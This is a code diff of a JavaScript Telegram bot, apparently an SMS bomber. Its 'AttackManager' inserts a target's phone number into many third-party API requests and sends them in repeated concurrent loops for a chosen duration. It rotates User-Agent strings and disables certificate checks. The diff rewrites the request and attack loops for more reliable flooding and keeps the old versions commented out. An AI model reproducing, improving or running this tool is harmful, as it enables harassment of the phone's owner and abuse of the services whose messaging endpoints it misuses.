@@ -248,59 +248,132 @@ class AttackManager {
       'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
     ];
   }
+//
 
   async makeRequest(api, phone) {
-    try {
-      const url = api.url.replace('{no}', phone);
-      const headers = { ...(api.headers || {}), 'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)] };
-      const timeout = 5000;
-      const axiosConfig = {
-        url,
-        method: (api.method || 'GET').toUpperCase(),
-        headers,
-        timeout,
-        httpsAgent: new https.Agent({ rejectUnauthorized: false }),
-        validateStatus: () => true
-      };
+  try {
+    const url = api.url.replace('{no}', phone);
 
-      if (axiosConfig.method === 'POST') {
-        const body = {};
-        if (api.body) {
-          Object.entries(api.body).forEach(([key, value]) => {
-            body[key] = typeof value === 'string' ? value.replace('{no}', phone) : value;
-          });
-        }
+    const headers = {
+      ...(api.headers || {}),
+      'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
+    };
 
-        if (headers['Content-Type'] && headers['Content-Type'].includes('application/json')) {
-          axiosConfig.data = body;
-        } else {
-          axiosConfig.data = body;
-        }
-      } else if (axiosConfig.method === 'GET') {
-        axiosConfig.params = api.params || api.body || {};
+    const axiosConfig = {
+      url,
+      method: (api.method || 'GET').toUpperCase(),
+      headers,
+      timeout: 20000, // 🔥 increased timeout
+      httpsAgent: new https.Agent({ rejectUnauthorized: false }),
+      validateStatus: () => true
+    };
+
+    if (axiosConfig.method === 'POST') {
+      const body = {};
+      if (api.body) {
+        Object.entries(api.body).forEach(([key, value]) => {
+          body[key] = typeof value === 'string'
+            ? value.replace('{no}', phone)
+            : value;
+        });
       }
-
-      await axios(axiosConfig);
-      return true;
-    } catch (error) {
-      return false;
+      axiosConfig.data = body;
+    } else {
+      axiosConfig.params = api.params || api.body || {};
     }
+
+    await axios(axiosConfig);
+    return true;
+
+  } catch (error) {
+    console.log("API fail:", error.message);
+    return false;
   }
+}
+
+  //
+
+  // async makeRequest(api, phone) {
+  //   try {
+  //     const url = api.url.replace('{no}', phone);
+  //     const headers = { ...(api.headers || {}), 'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)] };
+  //     const timeout = 5000;
+  //     const axiosConfig = {
+  //       url,
+  //       method: (api.method || 'GET').toUpperCase(),
+  //       headers,
+  //       timeout,
+  //       httpsAgent: new https.Agent({ rejectUnauthorized: false }),
+  //       validateStatus: () => true
+  //     };
+
+  //     if (axiosConfig.method === 'POST') {
+  //       const body = {};
+  //       if (api.body) {
+  //         Object.entries(api.body).forEach(([key, value]) => {
+  //           body[key] = typeof value === 'string' ? value.replace('{no}', phone) : value;
+  //         });
+  //       }
+
+  //       if (headers['Content-Type'] && headers['Content-Type'].includes('application/json')) {
+  //         axiosConfig.data = body;
+  //       } else {
+  //         axiosConfig.data = body;
+  //       }
+  //     } else if (axiosConfig.method === 'GET') {
+  //       axiosConfig.params = api.params || api.body || {};
+  //     }
+
+  //     await axios(axiosConfig);
+  //     return true;
+  //   } catch (error) {
+  //     return false;
+  //   }
+  // }
+
+  //
+
+  //
 
   async runAttack(userId, phone, duration, apis) {
-    const attack = this.activeAttacks.get(userId);
-    if (!attack) return;
+  const attack = this.activeAttacks.get(userId);
+  if (!attack) return;
 
-    while (attack.running && Date.now() < attack.endTime) {
-      const tasks = apis.map((api) => this.makeRequest(api, phone));
-      await Promise.allSettled(tasks);
-      await new Promise((resolve) => setTimeout(resolve, 500));
+  const limitedApis = apis.slice(0, 10); // 🔥 max 10 APIs
+
+  while (attack.running && Date.now() < attack.endTime) {
+
+    for (let i = 0; i < limitedApis.length; i += 5) {
+      const chunk = limitedApis.slice(i, i + 5);
+
+      await Promise.allSettled(
+        chunk.map(api => this.makeRequest(api, phone))
+      );
     }
 
-    if (this.activeAttacks.has(userId)) {
-      this.activeAttacks.delete(userId);
-    }
+    // 🔥 delay increase (stability)
+    await new Promise(resolve => setTimeout(resolve, 1000));
   }
+
+  this.activeAttacks.delete(userId);
+}
+
+  // async runAttack(userId, phone, duration, apis) {
+  //   const attack = this.activeAttacks.get(userId);
+  //   if (!attack) return;
+
+  //   while (attack.running && Date.now() < attack.endTime) {
+  //     const tasks = apis.map((api) => this.makeRequest(api, phone));
+  //     await Promise.allSettled(tasks);
+  //     await new Promise((resolve) => setTimeout(resolve, 500));
+  //   }
+
+  //   if (this.activeAttacks.has(userId)) {
+  //     this.activeAttacks.delete(userId);
+  //   }
+  // }
+
+  //
 
   async startAttack(userId, phone, duration, attackType = 'sms') {
     if (this.activeAttacks.has(userId)) return false;
@@ -580,6 +653,9 @@ bot.action(/dur_(.+)/, async (ctx) => {
 
   const attackType = session.attackType || 'sms';
   const success = await manager.startAttack(userId, phone, duration, attackType);
+  //
+  const apis = APIS.slice(0, 10);
+  //
   if (!success) {
     await ctx.editMessageText('❌ Failed to start attack. Please try again.');
     manager.db.clearAttackData(userId);
@@ -649,6 +725,12 @@ bot.launch().then(() => {
 }).catch((err) => {
   console.error('Failed to launch bot:', err);
 });
+//
+process.on("unhandledRejection", (err) => {
+  console.log("Unhandled Error:", err.message);
+});
+
+//
 
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
